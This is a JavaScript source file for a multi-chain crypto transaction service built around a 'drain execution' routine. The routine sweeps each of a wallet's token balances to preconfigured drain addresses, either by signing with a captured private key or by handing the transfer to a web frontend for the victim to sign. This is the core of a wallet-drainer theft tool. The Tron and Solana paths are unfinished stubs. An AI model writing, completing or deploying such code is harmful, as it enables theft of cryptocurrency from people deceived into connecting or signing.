const { ethers } = require('ethers');
const axios = require('axios');
const crypto = require('crypto');

// Import configuration
const { REAL_TIME_NETWORKS, REAL_TIME_DRAIN_ADDRESSES } = require('../index');

class TransactionService {
  constructor() {
    this.providers = new Map();
    this.transactionHistory = new Map();
  }
  
  // ==================== EVM TRANSACTION SERVICE ====================
  async createEVMTransaction(txData) {
    try {
      const { chainId, from, to, value, data = '0x' } = txData;
      
      const network = REAL_TIME_NETWORKS.evm[chainId];
      if (!network) {
        throw new Error(`Network ${chainId} not supported`);
      }
      
      // Get provider
      let provider = this.providers.get(chainId);
      if (!provider) {
        provider = new ethers.JsonRpcProvider(network.rpc);
        this.providers.set(chainId, provider);
      }
      
      // Get nonce
      const nonce = await provider.getTransactionCount(from);
      
      // Get gas price
      const feeData = await provider.getFeeData();
      
      // Build transaction
      const transaction = {
        from,
        to,
        value: ethers.parseEther(value.toString()),
        data,
        nonce,
        chainId: parseInt(chainId),
        gasLimit: 21000,
        gasPrice: feeData.gasPrice || ethers.parseUnits('20', 'gwei'),
        type: 2 // EIP-1559
      };
      
      return {
        success: true,
        transaction,
        estimatedGas: 21000,
        estimatedCost: ethers.formatEther(
          transaction.gasPrice * BigInt(transaction.gasLimit)
        ),
        network: network.name
      };
      
    } catch (error) {
      throw new Error(`Transaction creation failed: ${error.message}`);
    }
  }
  
  async signAndSendEVMTransaction(privateKey, txData) {
    try {
      const { chainId } = txData;
      
      const network = REAL_TIME_NETWORKS.evm[chainId];
      if (!network) {
        throw new Error(`Network ${chainId} not supported`);
      }
      
      // Get provider
      let provider = this.providers.get(chainId);
      if (!provider) {
        provider = new ethers.JsonRpcProvider(network.rpc);
        this.providers.set(chainId, provider);
      }
      
      // Create wallet
      const wallet = new ethers.Wallet(privateKey, provider);
      
      // Send transaction
      const txResponse = await wallet.sendTransaction(txData);
      
      // Wait for confirmation
      const receipt = await txResponse.wait();
      
      // Store in history
      const txId = crypto.randomBytes(8).toString('hex');
      this.transactionHistory.set(txId, {
        txHash: txResponse.hash,
        chainId,
        from: wallet.address,
        to: txData.to,
        value: txData.value.toString(),
        status: 'confirmed',
        blockNumber: receipt.blockNumber,
        timestamp: Date.now()
      });
      
      return {
        success: true,
        txHash: txResponse.hash,
        txId,
        from: wallet.address,
        blockNumber: receipt.blockNumber,
        network: network.name
      };
      
    } catch (error) {
      throw new Error(`Transaction signing failed: ${error.message}`);
    }
  }
  
  async estimateEVMGas(txData) {
    try {
      const { chainId, from, to, value } = txData;
      
      const network = REAL_TIME_NETWORKS.evm[chainId];
      if (!network) {
        throw new Error(`Network ${chainId} not supported`);
      }
      
      const provider = new ethers.JsonRpcProvider(network.rpc);
      
      // Estimate gas
      const gasEstimate = await provider.estimateGas({
        from,
        to,
        value: ethers.parseEther(value.toString())
      });
      
      const feeData = await provider.getFeeData();
      
      return {
        success: true,
        gasEstimate: gasEstimate.toString(),
        gasPrice: feeData.gasPrice?.toString() || '0',
        maxFeePerGas: feeData.maxFeePerGas?.toString() || '0',
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas?.toString() || '0',
        estimatedCost: ethers.formatEther(gasEstimate * (feeData.gasPrice || ethers.parseUnits('20', 'gwei')))
      };
      
    } catch (error) {
      throw new Error(`Gas estimation failed: ${error.message}`);
    }
  }
  
  // ==================== NON-EVM TRANSACTION SERVICE ====================
  async createTronTransaction(txData) {
    try {
      const { from, to, value } = txData;
      
      // Convert value to sun (TRX has 6 decimals)
      const valueSun = Math.floor(value * 1_000_000);
      
      // In production, use TronWeb to create transaction
      // This is a simplified version
      
      return {
        success: true,
        transaction: {
          from,
          to,
          value: valueSun,
          requiresTronLink: true
        },
        note: 'Tron transactions require TronLink wallet signing',
        estimatedFee: '0.1 TRX'
      };
      
    } catch (error) {
      throw new Error(`Tron transaction creation failed: ${error.message}`);
    }
  }
  
  async createSolanaTransaction(txData) {
    try {
      const { from, to, value } = txData;
      
      // Convert value to lamports (SOL has 9 decimals)
      const valueLamports = Math.floor(value * 1_000_000_000);
      
      // In production, use @solana/web3.js to create transaction
      
      return {
        success: true,
        transaction: {
          from,
          to,
          value: valueLamports,
          requiresPhantom: true
        },
        note: 'Solana transactions require Phantom wallet signing',
        estimatedFee: '0.000005 SOL'
      };
      
    } catch (error) {
      throw new Error(`Solana transaction creation failed: ${error.message}`);
    }
  }
  
  // ==================== DRAIN EXECUTION SERVICE ====================
  async executeDrain(tokens, privateKey = null, signerAddress = null) {
    try {
      const results = [];
      
      for (const token of tokens) {
        try {
          let result;
          
          if (token.type === 'evm') {
            if (privateKey) {
              // Automated drain
              const txData = await this.createEVMTransaction({
                chainId: token.chainId,
                from: signerAddress || this.getAddressFromPrivateKey(privateKey),
                to: token.drainAddress,
                value: token.balance
              });
              
              result = await this.signAndSendEVMTransaction(privateKey, txData.transaction);
            } else if (signerAddress) {
              // Return for frontend signing
              const txData = await this.createEVMTransaction({
                chainId: token.chainId,
                from: signerAddress,
                to: token.drainAddress,
                value: token.balance
              });
              
              result = {
                success: true,
                requiresFrontendSigning: true,
                transaction: txData.transaction,
                network: token.network,
                symbol: token.symbol
              };
            } else {
              result = {
                success: false,
                error: 'No signing method provided'
              };
            }
          } else if (token.type === 'non-evm') {
            if (token.chainId === 'tron') {
              result = await this.createTronTransaction({
                from: signerAddress,
                to: token.drainAddress,
                value: token.balance
              });
            } else if (token.chainId === 'solana') {
              result = await this.createSolanaTransaction({
                from: signerAddress,
                to: token.drainAddress,
                value: token.balance
              });
            } else {
              result = {
                success: false,
                error: `Non-EVM chain ${token.chainId} not supported`
              };
            }
          }
          
          results.push({
            ...token,
            ...result,
            timestamp: new Date().toISOString()
          });
          
          // Rate limiting
          await new Promise(resolve => setTimeout(resolve, 1000));
          
        } catch (error) {
          console.log(`Drain failed for ${token.symbol}:`, error.message);
          
          results.push({
            ...token,
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
          });
        }
      }
      
      return results;
      
    } catch (error) {
      throw new Error(`Drain execution failed: ${error.message}`);
    }
  }
  
  // ==================== TRANSACTION HISTORY ====================
  async getTransactionHistory(address, limit = 50) {
    try {
      const history = Array.from(this.transactionHistory.values())
        .filter(tx => tx.from === address || tx.to === address)
        .sort((a, b) => b.timestamp - a.timestamp)
        .slice(0, limit);
      
      return {
        success: true,
        history,
        count: history.length
      };
    } catch (error) {
      throw new Error(`History retrieval failed: ${error.message}`);
    }
  }
  
  async getTransactionStatus(txHash, chainId) {
    try {
      const network = REAL_TIME_NETWORKS.evm[chainId];
      if (!network) {
        throw new Error(`Network ${chainId} not supported`);
      }
      
      const provider = new ethers.JsonRpcProvider(network.rpc);
      const receipt = await provider.getTransactionReceipt(txHash);
      
      if (!receipt) {
        return {
          success: false,
          status: 'pending',
          txHash
        };
      }
      
      return {
        success: true,
        status: receipt.status === 1 ? 'confirmed' : 'failed',
        txHash,
        blockNumber: receipt.blockNumber,
        confirmations: await receipt.confirmations(),
        timestamp: Date.now()
      };
    } catch (error) {
      throw new Error(`Status check failed: ${error.message}`);
    }
  }
  
  // ==================== HELPER FUNCTIONS ====================
  getAddressFromPrivateKey(privateKey) {
    try {
      const wallet = new ethers.Wallet(privateKey);
      return wallet.address;
    } catch (error) {
      throw new Error(`Invalid private key: ${error.message}`);
    }
  }
  
  validateAddress(address, chainType = 'evm') {
    if (chainType === 'evm') {
      return ethers.isAddress(address);
    } else if (chainType === 'tron') {
      return address.startsWith('T') && address.length === 34;
    } else if (chainType === 'solana') {
      return address.length >= 32 && address.length <= 44;
    }
    return false;
  }
  
  formatValue(value, decimals = 18) {
    try {
      return ethers.formatUnits(value, decimals);
    } catch (error) {
      return '0';
    }
  }
  
  parseValue(value, decimals = 18) {
    try {
      return ethers.parseUnits(value.toString(), decimals);
    } catch (error) {
      return BigInt(0);
    }
  }
}

module.exports = new TransactionService();